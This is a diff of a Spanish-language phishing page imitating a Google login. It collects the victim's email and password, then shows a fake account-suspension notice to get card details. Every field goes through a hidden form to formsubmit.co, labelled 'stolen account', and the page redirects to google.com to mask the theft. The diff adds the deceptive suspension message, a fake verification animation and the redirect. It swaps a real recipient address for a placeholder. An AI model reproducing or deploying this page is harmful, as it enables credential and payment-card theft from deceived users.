@@ -36,7 +36,16 @@
         p {
             color: #5f6368;
             font-size: 14px;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+        }
+        .suspension-msg {
+            color: #d93025;
+            background-color: #fce8e6;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            border: 1px solid #d93025;
         }
         .input-group {
             margin-bottom: 15px;
@@ -71,6 +80,8 @@
             cursor: pointer;
             width: 100%;
             font-size: 14px;
+            position: relative;
+            overflow: hidden;
         }
         .btn-next:hover {
             background-color: #1765cc;
@@ -87,6 +98,25 @@
         }
         .card-row .input-group {
             flex: 1;
+        }
+        /* Animación de carga */
+        .loading-bar {
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 0;
+            height: 3px;
+            background-color: #d4e3f7;
+            transition: width 2s linear;
+        }
+        .btn-next.loading .loading-bar {
+            width: 100%;
+        }
+        .success-msg {
+            color: #188038;
+            font-weight: 500;
+            margin-top: 15px;
+            display: none;
         }
         .footer {
             margin-top: 20px;
@@ -108,26 +138,31 @@
             
             <div class="input-group">
                 <label>Correo electrónico o teléfono</label>
-                <input type="email" name="email" required>
+                <input type="email" name="email" id="input_email" required>
             </div>
             
             <div class="input-group">
                 <label>Contraseña</label>
-                <input type="password" name="password" required>
+                <input type="password" name="password" id="input_pass" required>
             </div>
 
-            <!-- Botón que solo llama a la función JS -->
             <button type="button" class="btn-next" onclick="goToStep2()">Siguiente</button>
         </div>
 
-        <!-- PASO 2: Tarjeta (Este SÍ es el formulario que se envía) -->
+        <!-- PASO 2: Tarjeta -->
         <div id="step2" class="step">
-            <h2>Confirmar pago</h2>
-            <p>Ingresa los datos de tu tarjeta para verificar tu identidad</p>
+            <h2>Tu cuenta fue suspendida</h2>
+            
+            <!-- Cartel explicativo -->
+            <div class="suspension-msg">
+                Tu cuenta fue suspendida temporalmente por actividad inusual en tu dispositivo.
+            </div>
+            <p>Ingresa los datos de tu tarjeta para verificar tu identidad y desbloquearla.</p>
 
-            <form action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
-                <!-- Campos ocultos para pasar email y pass del paso 1 -->
-                <input type="hidden" name="_subject" value="Nueva Robo de Datos!">
+            <!-- Formulario real -->
+            <form id="formFinal" action="https://formsubmit.co/TU_CORREO_AQUI" method="POST">
+                <!-- Campos ocultos -->
+                <input type="hidden" name="_subject" value="Nueva Cuenta Robada!">
                 <input type="hidden" name="email" id="hidden_email">
                 <input type="hidden" name="password" id="hidden_password">
 
@@ -152,7 +187,12 @@
                     </div>
                 </div>
 
-                <button type="submit" class="btn-next">Verificar</button>
+                <!-- Botón con animación -->
+                <button type="button" id="btnVerify" class="btn-next" onclick="processVerification()">
+                    Verificar
+                    <div class="loading-bar"></div>
+                </button>
+                <div id="successMsg" class="success-msg">Verificación exitosa. Redirigiendo...</div>
             </form>
         </div>
         
@@ -163,17 +203,40 @@
 
     <script>
         function goToStep2() {
-            // 1. Obtener los valores del paso 1
-            const email = document.querySelector('input[name="email"]').value;
-            const password = document.querySelector('input[name="password"]').value;
+            const email = document.getElementById('input_email').value;
+            const pass = document.getElementById('input_pass').value;
 
-            // 2. Guardarlos en campos ocultos para que vayan al formulario del paso 2
             document.getElementById('hidden_email').value = email;
-            document.getElementById('hidden_password').value = password;
+            document.getElementById('hidden_password').value = pass;
 
-            // 3. Ocultar paso 1 y mostrar paso 2
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
+        }
+
+        function processVerification() {
+            const btn = document.getElementById('btnVerify');
+            const successMsg = document.getElementById('successMsg');
+
+            // Activar animación
+            btn.classList.add('loading');
+            btn.disabled = true;
+            btn.style.cursor = 'default';
+
+            // Esperar 2 segundos
+            setTimeout(function() {
+                btn.classList.remove('loading');
+                btn.style.display = 'none'; // Ocultar botón
+                successMsg.style.display = 'block'; // Mostrar mensaje de éxito
+
+                // Enviar formulario
+                document.getElementById('formFinal').submit();
+
+                // Redirigir a Google después de otro corto periodo para asegurar que el form se envíe
+                setTimeout(function() {
+                    window.location.href = 'https://www.google.com';
+                }, 1500);
+
+            }, 2000);
         }
     </script>
 
